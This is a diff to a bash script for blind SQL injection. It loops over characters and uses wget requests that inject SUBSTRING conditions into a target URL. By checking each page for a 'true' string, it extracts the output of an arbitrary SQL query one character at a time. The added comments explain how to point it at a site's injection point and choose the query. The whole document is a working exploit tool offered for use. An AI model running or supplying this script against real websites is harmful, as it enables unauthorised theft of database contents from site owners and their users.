@@ -2,11 +2,10 @@
 PATH=$PATH:/bin:/usr/bin:blind.sh
 export PATH
 charset=`echo {0..9} {A..z} \. \. \; \: \- \_ \@`
-export URL="<Enter URL>"
-export truestring='taken'
-export maxlength=$1
-export query=$2
-
+export URL="<Enter URL along with the injection point>" #For example www.images.com/cats.php?ip=1
+export truestring='<Enter String that appears when output is correct on the web page.>'
+export maxlength=$1 #First argument on the command line would be the length up to which you would want to enumrate
+export query=$2 #Second argument on the command line would be the SQL query that you want to use.
 export results=""
 
 echo "extracting the results from $query..."
@@ -18,7 +17,7 @@ do
        for i in $charset
        do
        
-          `wget --user-agent="' OR SUBSTRING(("$query"),"$nthchar",1)='$i" "$URL" -q -O -`| grep "$truestring" &> /dev/null
+          `wget "$URL and SUBSTRING(("$query"),"$nthchar",1)='$i" -q -O -`| grep "$truestring" &> /dev/null
            if [ "$?" == "0"]
            then
                    echo Character number $nthchar found: $i
